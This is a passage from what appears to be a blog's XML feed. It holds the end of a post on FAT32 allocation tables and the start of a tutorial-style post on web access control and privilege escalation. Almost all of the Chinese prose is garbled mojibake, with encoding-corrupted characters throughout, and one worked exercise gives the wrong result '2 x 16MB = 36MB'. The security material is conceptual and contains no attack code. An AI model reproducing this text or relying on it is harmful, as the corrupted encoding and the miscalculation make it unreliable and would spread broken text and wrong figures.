æ–‡ä»¶ç»“æŸï¼Œä»£è¡¨è¯¥æ–‡ä»¶åœ¨æœ¬ç°‡å·å°±ç»“æŸäº†ã€‚</li></ol><p>ç»¼ä¸Šï¼Œæœ‰ 3 ä¸ªæ–‡ä»¶ã€‚</p><h3 id="fat32">FAT32</h3><h4 id="fat32-ç»“æ„">FAT32 ç»“æ„</h4><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200821214511.png"alt="FAT32" /><figcaption aria-hidden="true">FAT32</figcaption></figure><p>FAT32ä¸ä½¿ç”¨å›ºå®šçš„æ ¹ç›®å½•åŒºï¼Œæ ¹ç›®å½•ä¸å…¶å®ƒå­ç›®å½•ä¸€æ ·åŠ¨æ€åˆ†é…ç©ºé—´ï¼Œå…¶é¦–ç°‡å·åœ¨ BPBä¸­è®°å½•ã€‚</p><h4 id="fat32-ç™»è®°é¡¹è¡¨">FAT32 ç™»è®°é¡¹è¡¨</h4><p>FAT è¡¨ç”±ä¸€äº›åˆ—å¤§å°ç›¸ç­‰çš„è¡¨é¡¹ç»„æˆã€‚FAT32 ä¸­æ¯ä¸ªç°‡çš„çŠ¶æ€ï¼Œä½¿ç”¨ 32bit(4å­—èŠ‚)è®°å½•åœ¨ FAT è¡¨ä¸­ã€‚</p><p>FAT32 è¡¨ä¸­çš„æ‰€æœ‰å­—èŠ‚ä½ç½®ä»¥ 4ä¸ªå­—èŠ‚ä¸ºå•ä½è¿›è¡Œåˆ’åˆ†,å¹¶ä»¥æ‰€æœ‰åˆ’åˆ†åçš„ä½ç½®ç”± 0 è¿›è¡Œåœ°å€ç¼–å·ã€‚â€œ0 å· å’Œ 1å·â€ åœ°å€è¢«ç³»ç»Ÿä¿ç•™å¹¶å­˜å‚¨ç‰¹æ®Šæ ‡è¯†å†…å®¹ã€‚</p><p>ä» 2 å·åœ°å€å¼€å§‹ï¼Œæ¯ä¸ªåœ°å€å¯¹åº”äºæ•°æ®åŒºçš„ç°‡å·ï¼ŒFATè¡¨ä¸­çš„ç°‡ç™»è®°é¡¹ç¼–å·ä¸æ•°æ®åŒºä¸­çš„ç°‡å·ç›¸åŒã€‚ç§° FATä¸­çš„è¿™äº›å››å­—èŠ‚ä¸€ç»„åˆ’åˆ†çš„é¡¹çš„åœ°å€ä¸º FAT è¡¨é¡¹ï¼Œ FAT è¡¨é¡¹ä¸­è®°å½•çš„å€¼ä¸º FATè¡¨é¡¹å€¼ã€‚(ç°‡ç¼–å·ä¸ç°‡å†…å†…å®¹å…³ç³» å’Œ Map ä¸­çš„é”®-å€¼å…³ç³»ç›¸åŒ)</p><p>å½“æ–‡ä»¶ç³»ç»Ÿåˆ›å»ºæ—¶(å°±æ˜¯æ ¼å¼åŒ–æ“ä½œæ—¶)ï¼Œåˆ†é…ç»™ FAT åŒºåŸŸçš„ç©ºé—´å°†ä¼šè¢«æ¸…ç©ºï¼Œåœ¨ FAT1 ä¸ FAT2 çš„ 0 å·å’Œ 1å·è¡¨é¡¹å†™å…¥ç‰¹å®šå€¼ã€‚ç”±äºåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿçš„åŒæ—¶ï¼Œä¹Ÿä¼šåˆ›å»ºæ ¹ç›®å½•ï¼Œä¹Ÿå°±æ˜¯ä¸ºæ ¹ç›®å½•åˆ†é…äº†ä¸€ä¸ªç°‡ç©ºé—´ï¼Œé€šå¸¸ä¸º2 å·ç°‡ï¼Œæ‰€ä»¥ 2 å·ç°‡æ‰€å¯¹åº”çš„ â€œ2 å· FAT è¡¨é¡¹â€ ä¹Ÿä¼šè¢«å†™å…¥ä¸€ä¸ªç»“æŸæ ‡è®°ã€‚</p><p><strong>FAT32 è¡¨æ ¼å¼è¯´æ˜</strong>:</p><ul><li><p>å¦‚æœæŸä¸ªç°‡æœªè¢«ä½¿ç”¨ï¼Œä»–æ‰€å¯¹åº”çš„ FAT è¡¨é¡¹å†…çš„ FAT è¡¨é¡¹å€¼å³ç”¨ 0è¿›è¡Œå¡«å……ï¼Œè¡¨ç¤ºè¯¥ FAT è¡¨é¡¹æ‰€å¯¹åº”çš„ç°‡æœªè¢«åˆ†é…ä½¿ç”¨</p></li><li><p>å½“æŸä¸ªç°‡è¢«åˆ†é…ä½¿ç”¨æ—¶ï¼Œé‚£ä¹ˆä»–æ‰€å¯¹åº”çš„ FATè¡¨é¡¹çš„å€¼ä¸ºæ–‡ä»¶çš„ä¸‹ä¸€ä¸ªå­˜å‚¨æ–‡ä»¶çš„ç°‡å·ã€‚å¦‚æœè¯¥æ–‡ä»¶ç»“æŸäºè¯¥ç°‡ï¼Œåˆ™åœ¨å®ƒçš„ FATè¡¨é¡¹ä¸­è®°å½•çš„æ˜¯ä¸€ä¸ªæ–‡ä»¶ç»“æŸæ ‡è®°ï¼Œå¯¹äº FAT32 è€Œè¨€ï¼Œ<strong>ä»£è¡¨æ–‡ä»¶ç»“æŸçš„FAT è¡¨é¡¹å€¼ä¸º 0x0FFFFFFF</strong>ã€‚</p></li><li><p>å¦‚æœæŸä¸ªç°‡å­˜åœ¨åæ‰‡åŒºï¼Œåˆ™æ•´ä¸ªç°‡ä¼šç”¨ FAT è¡¨é¡¹å€¼ 0x0FFFFFF7æ ‡è®°ä¸ºåç°‡ï¼Œ ä¸å†ä½¿ç”¨ï¼Œè¿™ä¸ªåç°‡æ ‡è®°å°±è®°å½•åœ¨å®ƒæ‰€å¯¹åº”çš„ FATè¡¨é¡¹ä¸­ã€‚</p></li><li><p>ç”±äºç°‡å·èµ·å§‹äº 2ï¼Œ æ‰€ä»¥ FAT è¡¨çš„ 0 å·è¡¨é¡¹ä¸ 1å·è¡¨é¡¹ä¸äºˆä»»ä½•ç°‡å¯¹åº”ã€‚FAT32 çš„ 0 å·è¡¨é¡¹å€¼æ€»æ˜¯ â€œF8FFFF0Fâ€</p></li></ul><p>æ³¨æ„ï¼š å¯ä»¥æœç´¢æ‰‡åŒºåç§» 0 å­—èŠ‚å¤„çš„è¯¥å€¼(F8FFF0F)ä»¥æŸ¥æ‰¾ FAT è¡¨ã€‚</p><ul><li>1 å·è¡¨é¡¹å¯èƒ½è¢«ç”¨äºè®°å½•â€œè„æ ‡å¿—â€ï¼Œä»¥è¯´æ˜æ–‡ä»¶ç³»ç»Ÿæ²¡æœ‰è¢«æ­£å¸¸å¸è½½æˆ–è€…ç£ç›˜è¡¨é¢å­˜åœ¨é”™è¯¯ã€‚ä¸è¿‡æ­¤å€¼ä¼¼ä¹ä¸é‡è¦ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œ1å·è¡¨é¡¹ä¸º:â€œFFFFFFFFâ€æˆ–â€œFFFFFF0Fâ€ï¼ˆå½“ç„¶ï¼Œè¿™é‡Œæ˜¯ç›´æ¥çœ‹ä¸Šå»ï¼Œå¦‚æœè¯´å…¶å€¼çš„è¯ï¼Œéœ€è¦æŒ‰ç…§å°ç«¯æ¨¡å¼è¯»å‡ºæ¥ï¼Œâ€œ0xFFFFFFFFâ€æˆ–â€œ0x0FFFFFFFâ€ï¼‰</li></ul><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423135739.png"alt="FAT32 å®ä¾‹" /><figcaption aria-hidden="true">FAT32 å®ä¾‹</figcaption></figure><p>é‚£ä¹ˆè¿™ä¸ª FAT32 è¡¨æœ‰å‡ ä¸ªæ–‡ä»¶å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯: 10 ä¸ªæ–‡ä»¶.è¿™é‡Œå°±ä¸è¯¦ç»†ä»‹ç»äº†ï¼Œæ ¹æ® FAT16 çš„å®ä¾‹å’Œä¸Šé¢ FAT32çš„æ ¼å¼è¯´æ˜ï¼Œåº”è¯¥å¾ˆå®¹æ˜“ç†è§£ã€‚</p><h2 id="è®¡ç®—å…¬å¼">è®¡ç®—å…¬å¼</h2><ol type="1"><li><p>å·²çŸ¥ç°‡å·ï¼Œå¦‚ä½•æ‰¾åˆ°å¯¹åº”çš„æ‰‡åŒºå·ï¼Ÿ</p><p><code>logic_sector_sn=(kown_cluster_sn-2)*Sector_per_cluster+DATA_begin_sector_sn</code><code>é€»è¾‘æ‰‡åŒºå· = (å·²çŸ¥ç°‡å· - 2) * æ¯ç°‡çš„æ‰‡åŒºæ•° + DATA åŒºèµ·å§‹æ‰‡åŒºå·</code></p><p>å·²çŸ¥ç°‡å· - 2 çš„æ˜¯å› ä¸ºè¦æ±‚é€»è¾‘æ‰‡åŒºå·(å³: ç›¸å¯¹äº DBR åŒºçš„æ‰‡åŒºå·)ï¼Œè€ŒDATA åŒºé»˜è®¤ä» 2 ç°‡å¼€å§‹ã€‚</p></li><li><p>FAT è¡¨çš„å…¥å£åœ°å€ ï¼ éšè—æ‰‡åŒºæ•° + ä¿ç•™æ‰‡åŒºæ•°</p></li></ol><p>é€‚ç”¨äº FAT16:</p><ol type="1"><li>æ ¹ç›®å½•åŒºçš„å…¥å£åœ°å€ = FAT è¡¨çš„å…¥å£åœ°å€ + æ‰€æœ‰ FAT çš„æ‰‡åŒºæ•°</li><li>DATA æ•°æ®åŒºçš„å…¥å£åœ°å€ = æ ¹ç›®å½•åŒºçš„å…¥å£åœ°å€ + æ ¹ç›®å½•åŒºçš„æ‰‡åŒºæ•°</li></ol><p>é€‚ç”¨äº FAT32:</p><ol type="1"><li>DATA æ•°æ®åŒºçš„å…¥å£åœ°å€ = FAT è¡¨çš„å…¥å£åœ°å€ + æ‰€æœ‰ FAT çš„æ‰‡åŒºæ•°</li><li>æ ¹ç›®å½•åŒºï¼ˆFDTï¼‰çš„å…¥å£åœ°å€ = DATA åŒºèµ·å§‹æ‰‡åŒºå· + (é¦–ç°‡å· -2)*æ¯ç°‡çš„æ‰‡åŒºæ•°</li></ol><h2 id="ä¹ é¢˜">ä¹ é¢˜</h2><ol type="1"><li>è®¾ï¼šç°‡ç©ºé—´è®¾ç½®ä¸ºæ¯ç°‡ 512Bï¼Œåˆ†åŒºå¤§å°ä¸º 16GBï¼Œå³ FAT32 è¡¨å å¤šå°‘ç©ºé—´ï¼Ÿæœ€å¤§ç°‡å·ä¸º 16GB/512B = 16*(2^30)/512 = 33 554 432 FAT32 è¡¨é¡¹ä¸ºæ¯ä¸ªç°‡å  4ä¸ªå­—èŠ‚ï¼Œå³ 33 554 432 x 4B = 128MB 2 ä¸ª FAT32 è¡¨ï¼Œå³ 2 x 128MB =256MB</li><li>è®¾ï¼šç°‡ç©ºé—´è®¾ç½®ä¸ºæ¯ç°‡ 4KBï¼Œåˆ†åŒºå¤§å°ä¸º 16GBï¼Œå³ FAT32 è¡¨å å¤šå°‘ç©ºé—´ï¼Ÿæœ€å¤§ç°‡å·ä¸º 16GB/4KB=4 194 304<br />FAT32 è¡¨é¡¹ä¸ºæ¯ä¸ªç°‡å  4 ä¸ªå­—èŠ‚ï¼Œå³ 4 194 304 x 4B = 16MB 2 ä¸ª FAT32è¡¨ï¼Œå³ 2 x 16MB = 36MB</li><li>è®¿é—®æ—¶é—´æ•ˆç‡é€šè¿‡æ¯”è¾ƒæ–‡ä»¶æ‰€å ç°‡çš„ä¸ªæ•°æ¥å®ç°</li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="http://www.360doc.com/content/19/1029/09/1367418_869698315.shtml">FAT32æ–‡ä»¶æ ¼å¼ç¤ºä¾‹è§£æ</a></li><li><ahref="https://example61560.files.wordpress.com/2016/06/fat.pdf">æ•°æ®æ¢å¤ä¹‹Fat ç¯‡</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Computer </tag>
            
            <tag> FAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¿é—®æ§åˆ¶ä¸è¶Šæƒ</title>
      <link href="/blog/2020/03/25/websec/logic_vuln/access_control/"/>
      <url>/blog/2020/03/25/websec/logic_vuln/access_control/</url>
      
        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1><p>è®¿é—®æ§åˆ¶å¾€å¾€æ˜¯æ¼æ´çš„é«˜å‘åœ°å¸¦ï¼Œè€Œä¸”å¾€å¾€æ˜¯å±å®³ä¸¥é‡ã€‚æ—¶è‡³ä»Šæ—¥ï¼Œæœ€æ–°ç‰ˆçš„OWASP 2017 top 10 ä¸­ Broken Access Control ä»ä½å±…ç¬¬äº”ã€‚</p><p>æœ¬æ–‡å°†è®¨è®ºè®¿é—®æ§åˆ¶å®‰å…¨ï¼Œè®²è¿°è¶Šæƒä»¥åŠé‚£äº›ç”±è®¿é—®æ§åˆ¶ä¸å½“è€Œå¯¼è‡´çš„æ¼æ´ï¼Œæœ€åæ€»ç»“å¦‚ä½•é¿å…è¿™äº›æ¼æ´ï¼Œä¸‹é¢æˆ‘ä»¬å…ˆæ¥äº†è§£ä»¥ä¸‹ä¸‰ä¸ªæ¦‚å¿µä»¥åŠä»–ä»¬ä¹‹é—´çš„å…³ç³»ã€‚</p><h2 id="three-concepts">Three Concepts</h2><ul><li><p>èº«ä»½éªŒè¯ ( è®¤è¯)ï¼šé‰´åˆ«ç”¨æˆ·èº«ä»½ï¼Œç¡®å®šè¯¥ç”¨æˆ·ä¸ä»–è‡ªå·±æ‰€å£°ç§°çš„èº«ä»½ä¸€è‡´ã€‚ Authenticationidentifies the user and confirms that they are who they say theyare.</p></li><li><p>ä¼šè¯ç®¡ç†ï¼šç¡®å®šåç»­çš„ HTTP è¯·æ±‚æ˜¯ç”±ä¸ä¹‹å‰ç›¸åŒçš„ç”¨æˆ·å‘å‡ºã€‚ Sessionmanagement identifies which subsequent HTTP requests are being made bythat same user.</p></li><li><p>è®¿é—®æ§åˆ¶ç¡®å®šæ˜¯å¦å…è®¸ç”¨æˆ·æ‰§è¡Œä»–ä»¬å°è¯•æ‰§è¡Œçš„æ“ä½œã€‚ Access controldetermines whether the user is allowed to carry out the action that theyare attempting to perform.</p></li></ul><blockquote><p>ä»é€»è¾‘ä¸Šè®²ï¼Œåº”ç”¨ç¨‹åºæ ¸å¿ƒå®‰å…¨æœºåˆ¶çš„è®¿é—®æ§åˆ¶å»ºç«‹åœ¨<strong>éªŒè¯å’Œä¼šè¯ç®¡ç†</strong>ä¹‹ä¸Šï¼Œå°¤å…¶æ˜¯åœ¨Webåº”ç”¨ç¨‹åºçš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­æ›´æ˜¯å¦‚æ­¤ã€‚åº”ç”¨ç¨‹åºé€šè¿‡éªŒè¯æœºåˆ¶æ¥æ ¸å®ç”¨æˆ·èº«ä»½ï¼Œå¹¶é€šè¿‡ä¼šè¯ç®¡ç†æ¥ä¿è¯å®ƒæ”¶åˆ°çš„ä¸€ç³»åˆ—è¯·æ±‚ç”±è¯¥ç”¨æˆ·å‘å‡ºã€‚åº”ç”¨ç¨‹åºä¹‹æ‰€ä»¥éœ€è¦è¿™æ ·åšï¼Œè‡³å°‘ä»å®‰å…¨ä¸Šè®²ï¼Œæ˜¯å› ä¸ºå®ƒå¿…é¡»å†³å®šæ˜¯å¦å…è®¸æŸä¸ªè¯·æ±‚æ‰§è¡Œç‰¹å®šçš„<strong>æ“ä½œ</strong>æˆ–è®¿é—®å®ƒè¯·æ±‚çš„<strong>èµ„æº</strong>ã€‚è®¿é—®æ§åˆ¶æ˜¯åº”ç”¨ç¨‹åºçš„ä¸€ä¸ªé‡è¦é˜²å¾¡æœºåˆ¶ï¼Œå› ä¸ºå®ƒä»¬è´Ÿè´£åšå‡ºè¿™äº›å…³é”®å†³å®šã€‚å¦‚æœè®¿é—®æ§åˆ¶å­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…å¾€å¾€èƒ½å¤Ÿæ”»ç ´æ•´ä¸ªåº”ç”¨ç¨‹åºï¼Œæ§åˆ¶å…¶ç®¡ç†åŠŸèƒ½å¹¶è®¿é—®å±äºå…¶ä»–ç”¨æˆ·çš„æ•æ„Ÿæ•°æ®ã€‚</p><p>å½“ç„¶ï¼Œå³ä½¿æ˜¯åº”ç”¨ç¨‹åºåšå‡ºä¸€åˆ‡åŠªåŠ›æ‰§è¡Œç¨³å®šçš„éªŒè¯ä¸ä¼šè¯ç®¡ç†æœºåˆ¶ï¼Œä½†ç”±äºæ²¡æœ‰åœ¨å®ƒä»¬ä¸Šé¢å»ºç«‹ä»»ä½•æœ‰æ•ˆçš„è®¿é—®æ§åˆ¶ï¼Œè¿™æ–¹é¢çš„æŠ•èµ„ä¹Ÿå°±ç›¸å½“äºç™½ç™½æµªè´¹äº†ï¼Œè¿™ç§æƒ…å†µéå¸¸å¸¸è§ã€‚è¿™äº›æ¼æ´å¦‚æ­¤æ™®éçš„ä¸€ä¸ªåŸå› åœ¨äºï¼Œéœ€è¦å¯¹æ¯ä¸€ä¸ªè¯·æ±‚ï¼Œä»¥åŠç‰¹æ®Šç”¨æˆ·åœ¨ç‰¹å®šæ—¶åˆ»å°è¯•å¯¹èµ„æºæ‰§è¡Œçš„æ¯ä¸€é¡¹æ“ä½œæ‰§è¡Œè®¿é—®æ§åˆ¶æ£€æŸ¥ã€‚</p><p>è€Œä¸”ï¼Œä¸è®¸å¤šå…¶ä»–ç±»å‹çš„æ§åˆ¶ä¸åŒï¼Œè®¿é—®æ§åˆ¶çš„è®¾è®¡å’Œç®¡ç†æ˜¯ä¸€ä¸ªå¤æ‚è€ŒåŠ¨æ€å˜åŒ–çš„é—®é¢˜ï¼Œå®ƒéœ€è¦å°†å¤æ‚çš„ä¸šåŠ¡é€»è¾‘ï¼Œç»„ç»‡å’Œæ³•å¾‹çº¦æŸç­‰ç”¨æŠ€æœ¯å®ç°ï¼Œè€Œæ¯ä¸ªä¼ä¸šä¸šåŠ¡ã€æ³•å¾‹çº¦æŸã€ç»„ç»‡è§„èŒƒåˆéƒ½æ˜¯ä¸ä¸€æ ·çš„ã€‚è¿™å¯¼è‡´è®¿é—®æ§åˆ¶çš„è®¾è®¡å†³ç­–å¿…é¡»ç”±äººå†³å®šï¼Œè€Œæ— æ³•é‡‡ç”¨æŠ€æœ¯æ¥è§£å†³ã€‚ä¹Ÿå› æ­¤ï¼Œè¶Šæƒæ¼æ´å¾ˆéš¾é€šè¿‡æ‰«æå·¥å…·å‘ç°å‡ºæ¥ï¼Œå¾€å¾€éœ€è¦é€šè¿‡æ‰‹åŠ¨è¿›è¡Œæµ‹è¯•ã€‚</p></blockquote><p>æ³¨æ„ï¼š ä¸Šé¢ä¸‰æ®µè¿™ä¹ˆæ·±åˆ»ï¼ˆè‚¯å®šä¸æ˜¯æˆ‘å†™çš„ï¼‰ï¼ŒåŸºæœ¬é€‰è‡ªã€Šé»‘å®¢æ”»é˜²æŠ€æœ¯å®å…¸Web å®æˆ˜ç¯‡ï¼ˆç¬¬ 2 ç‰ˆï¼‰ã€‹</p><h3 id="examples">Examples</h3><p>ä½ é€šè¿‡æ›´æ”¹ idæ¥å®ç°æŸ¥çœ‹åˆ«çš„èµ„æ–™ç­‰ï¼Œåº”ç”¨ç¨‹åºéªŒè¯äº†ä½ æ˜¯ä½ ï¼Œç„¶åé€šè¿‡ä¼šè¯ç®¡ç†æœºåˆ¶ç¡®ä¿äº†è¯¥è¯·æ±‚æ˜¯ç”±ä½ å‘å‡ºï¼Œä½†æ˜¯ç”±äºæƒé™æ§åˆ¶æ²¡åšåˆ°ä½ï¼Œæ²¡æœ‰é™åˆ¶ä½ è®¿é—®åˆ«äººçš„èµ„æ–™ï¼Œè¿›è€Œå°±äº§ç”Ÿäº†è¿™ä¸ªæ¼æ´ã€‚</p><h2 id="access-control">Access Control</h2><p>è®¿é—®æ§åˆ¶æ˜¯æŒ‡åœ¨åº”ç”¨ç¨‹åºä¸­ï¼Œå¯¹ç”¨æˆ·å°è¯•æ‰§è¡Œçš„<strong>æ“ä½œ</strong>æˆ–å°è¯•è¯·æ±‚çš„<strong>èµ„æº</strong>çš„æ§åˆ¶ã€‚æ¢å¥è¯è¯´ï¼Œå½“æ”»å‡»è€…å¯ä»¥è®¿é—®æˆ–ä¿®æ”¹ä»–ä»¬æœ¬ä¸å¯è®¿é—®çš„<strong>å¯¹è±¡</strong>ï¼ˆä¾‹å¦‚æ–‡ä»¶,æ•°æ®åº“è®°å½•ï¼Œå¸æˆ·ç­‰ï¼‰æˆ–ä½¿ç”¨ä¸€äº›å…¶æœ¬ä¸è¯¥å…·æœ‰çš„<strong>åŠŸèƒ½</strong>ï¼Œå°±å­˜åœ¨è®¿é—®æ§åˆ¶æ¼æ´ã€‚</p><p>å¹¶é™„ä¸Š OWSAP å¯¹æœ‰ç¼ºé™·çš„æƒé™æ§åˆ¶çš„æè¿°ï¼š</p><blockquote><p><ahref="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control"><strong>BrokenAccess Control</strong></a>. Restrictions on what authenticated usersare allowed to do are often not properly enforced. Attackers can exploitthese flaws to access unauthorized functionality and/or data, such asaccess other usersâ€™ accounts, view sensitive files, modify other usersâ€™data, change access rights, etc.</p></blockquote><p>å¯ä»¥å°†è®¿é—®æ§åˆ¶åˆ†ä¸ºä¸‰ç±»ï¼š</p><ol type="1"><li>å‚ç›´æƒé™è®¿é—®æ§åˆ¶ï¼ˆVertical access controlsï¼‰</li><li>æ°´å¹³æƒé™è®¿é—®æ§åˆ¶ï¼ˆHorizontal access controlsï¼‰</li><li>åŸºäºä¸Šä¸‹æ–‡çš„è®¿é—®æ§åˆ¶ï¼ˆContext-dependent access controlsï¼‰</li></ol><h2 id="vertical-access-controls">Vertical access controls</h2><p>è®¿é—®æ§åˆ¶æ˜¯å»ºç«‹ç”¨æˆ·è§’è‰²ä¸æƒé™ä¹‹é—´çš„å…³ç³»ï¼Œ</p><p>å‚ç›´è®¿é—®æ§åˆ¶æ˜¯ä¸€ç§åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼ˆRBACï¼ŒRole Based AccessControlï¼‰ï¼Œå®ƒæ˜¯æŒ‡å°†ç³»ç»Ÿä¸­çš„ç”¨æˆ·çš„æƒé™ä»¥è§’è‰²ï¼ˆRoleï¼‰åˆ’åˆ†ï¼Œæ ¹æ®è§’è‰²æ¥é™åˆ¶å¯ä½¿ç”¨çš„æ•æ„ŸåŠŸèƒ½ç‚¹ã€‚é€šè¿‡å‚ç›´è®¿é—®æ§åˆ¶ï¼Œä¸åŒç±»å‹çš„ç”¨æˆ·å¯ä»¥è®¿é—®ä¸åŒçš„åº”ç”¨ç¨‹åºåŠŸèƒ½ã€‚å‚ç›´è®¿é—®æ§åˆ¶æ˜¯å®‰å…¨æ¨¡å‹çš„æ›´åŠ ç»†ç²’åº¦çš„å®ç°ï¼Œè¿™äº›å®‰å…¨æ¨¡å‹æ—¨åœ¨å°†ä¼ä¸šç­–ç•¥ç­‰ä»˜è¯¸å®è·µï¼Œä¾‹å¦‚èŒè´£å’Œæœ€ä½ç‰¹æƒçš„åˆ†ç¦»ã€‚</p><h3 id="example">Example</h3><p>åœ¨ä¸€ä¸ªè®ºå›ä¸­ï¼Œæœ‰ç®¡ç†å‘˜ã€æ™®é€šç”¨æˆ·ã€æ¸¸å®¢ä¸‰ç§è§’è‰²ï¼Œç®¡ç†å‘˜æœ‰åˆ é™¤ã€ç¼–è¾‘ã€ç½®é¡¶å¸–å­çš„æƒé™ï¼Œæ™®é€šç”¨æˆ·æœ‰è¯„è®ºå’Œæµè§ˆå¸–å­çš„æƒé™ï¼Œæ¸¸å®¢åªæœ‰æµè§ˆå¸–å­çš„æƒé™ã€‚ç›®å‰å·²æœ‰Shiroï¼ŒSpring Security ç­‰åŸºäº RBACæ¨¡å‹çš„æˆç†Ÿæ¡†æ¶æ¥å¤„ç†åŠŸèƒ½æƒé™ç®¡ç†å’Œé‰´æƒçš„é—®é¢˜ã€‚</p><h2 id="horizontal-access-controls">Horizontal access controls</h2><p>æ°´å¹³è®¿é—®æ§åˆ¶æ˜¯ä¸€ç§åŸºäºæ•°æ®çš„è®¿é—®æ§åˆ¶ï¼Œå®ƒé€šè¿‡é™åˆ¶ç‰¹å®šç”¨æˆ·è®¿é—®å…¶å¯¹åº”çš„ç‰¹å®šèµ„æºæ¥å®ç°ã€‚é€šè¿‡æ°´å¹³è®¿é—®æ§åˆ¶ï¼Œä¸åŒçš„ç”¨æˆ·å¯ä»¥è®¿é—®ç›¸åŒç±»å‹çš„èµ„æºçš„å­é›†ã€‚ä¾‹å¦‚ï¼Œé“¶è¡Œä¸šåŠ¡åº”ç”¨ç¨‹åºå°†å…è®¸ç”¨æˆ·æŸ¥çœ‹è‡ªå·±çš„äº¤æ˜“å¹¶ä»è‡ªå·±çš„å¸æˆ·è¿›è¡Œä»˜æ¬¾ï¼Œä½†ä¸èƒ½æŸ¥çœ‹å…¶ä»–ä»»ä½•ç”¨æˆ·çš„å¸æˆ·ã€‚</p><h3 id="example-1">Example</h3><p>åŒå±äºæ™®é€šç”¨æˆ·è§’è‰²çš„ç”¨æˆ· A å’Œç”¨æˆ·Bï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œä»–ä»¬åªèƒ½è®¿é—®è‡ªå·±çš„ç§æœ‰æ•°æ®ï¼Œä¾‹å¦‚ï¼šä¿®æ”¹/æŸ¥çœ‹ä¸ªäººè¯¦ç»†èµ„æ–™ã€å¢åŠ /æŸ¥çœ‹/åˆ é™¤ä¸ªäººè®¢å•ã€æŸ¥çœ‹/åˆ é™¤ä¸ªäººé‚®ä»¶ç­‰ã€‚</p><h2 id="context-dependent-access-controls">Context-dependent accesscontrols</h2><p>åŸºäºä¸Šä¸‹æ–‡çš„è®¿é—®æ§åˆ¶æ ¹æ®åº”ç”¨ç¨‹åºçš„çŠ¶æ€æˆ–ç”¨æˆ·ä¸åº”ç”¨ç¨‹åºçš„äº¤äº’æ¥é™åˆ¶å¯¹åŠŸèƒ½å’Œèµ„æºçš„è®¿é—®ã€‚</p><p>ä¸Šä¸‹æ–‡ç›¸å…³çš„è®¿é—®æ§åˆ¶å¯é˜²æ­¢ç”¨æˆ·ä»¥é”™è¯¯çš„é¡ºåºæ‰§è¡Œæ“ä½œã€‚ä¾‹å¦‚ï¼Œé›¶å”®ç½‘ç«™å¯èƒ½ä¼šé˜»æ­¢ç”¨æˆ·åœ¨ä»˜æ¬¾åä¿®æ”¹è´­ç‰©è½¦ä¸­çš„å†…å®¹ã€‚æ‰¾å›å¯†ç è¿‡ç¨‹ä¸­ï¼Œä¸èƒ½</p><h3 id="examples-1">Examples</h3><p>åœ¨è´­ç‰©ç½‘ç«™çš„ä»˜æ¬¾çš„å¤šé˜¶æ®µè¿‡ç¨‹ï¼šï¼ˆæ·»åŠ è´­ç‰©è½¦ -&gt; ï¼‰ç‚¹å‡»è´­ä¹° -&gt;ä¸‹è®¢å• -&gt; ä»˜æ¬¾ -&gt; ç¡®è®¤è®¢å•ï¼› åœ¨æ‰¾å›å¯†ç çš„å¤šé˜¶æ®µè¿‡ç¨‹ï¼š(ç”¨æˆ·å-&gt;) æ‰‹æœºå·/é‚®ç®± -&gt; éªŒè¯ç  -&gt;æ–°å¯†ç ï¼›éœ€è¦ç¡®ä¿å‰åçš„æ•°æ®ç­‰çš„ä¸€è‡´æ€§ä»¥åŠæŒ‰é¡ºåºè¿›è¡Œã€‚</p><h1 id="vertical-privilege-escalation">Vertical privilegeescalation</h1><p>å¦‚æœç”¨æˆ·å¯ä»¥ä½¿ç”¨é‚£äº›ä»–ä»¬ä¸è¢«å…è®¸ä½¿ç”¨çš„åŠŸèƒ½ï¼Œé‚£è¿™å°±æ˜¯å‚ç›´è¶Šæƒã€‚ä¾‹å¦‚ï¼šå¦‚æœéç®¡ç†ç”¨æˆ·å¯ä»¥è®¿é—®å¯ä»¥å…·æœ‰åˆ é™¤ç”¨æˆ·å¸æˆ·åŠŸèƒ½çš„ç®¡ç†é¡µé¢ï¼Œåˆ™è¿™æ˜¯å‚ç›´è¶Šæƒã€‚</p><h2 id="unprotected-functionality">Unprotected functionality</h2><p>åœ¨æœ€åŸºæœ¬çš„æƒ…å†µä¸‹ï¼Œå¦‚æœåº”ç”¨ç¨‹åºä¸å¯¹æ•æ„ŸåŠŸèƒ½å®æ–½ä»»ä½•ä¿æŠ¤ï¼Œåˆ™ä¼šå‡ºç°å‚ç›´è¶Šæƒã€‚ä¾‹å¦‚ï¼šç®¡ç†å‘˜çš„æ¬¢è¿é¡µé¢ä¸­é“¾æ¥ç€ç®¡ç†åŠŸèƒ½ï¼Œè€Œç”¨æˆ·çš„æ¬¢è¿é¡µé¢å°±æ²¡æœ‰ã€‚ä½†æ˜¯ï¼Œç”¨æˆ·å¯èƒ½å¯ä»¥é€šè¿‡ç›´æ¥è®¿é—®æµè§ˆç›¸å…³çš„ç®¡ç†URL ï¼Œå°±èƒ½è®¿é—®ç®¡ç†åŠŸèƒ½ã€‚</p><p>ä¾‹å¦‚ï¼šä¸€ä¸ªç½‘ç«™åœ¨ä»¥ä¸‹çš„ URL ä¸­å­˜åœ¨ç€æ•æ„ŸåŠŸèƒ½ç‚¹ï¼š<code>https://insecure-website.com/admin</code></p><p>å®é™…ä¸Šï¼Œåœ¨è¯¥ç½‘ç«™ä¸­ï¼Œä¸ä»…æ˜¯åœ¨å…¶ç”¨æˆ·ç•Œé¢ä¸­å­˜åœ¨è¯¥åŠŸèƒ½é“¾æ¥çš„ç®¡ç†å‘˜ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥è®¿é—®æ­¤ç›®å½•ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç®¡ç† URL å¯èƒ½ä¼šåœ¨å…¶ä»–ä½ç½®æ³„éœ²ï¼Œä¾‹å¦‚ robots.txt 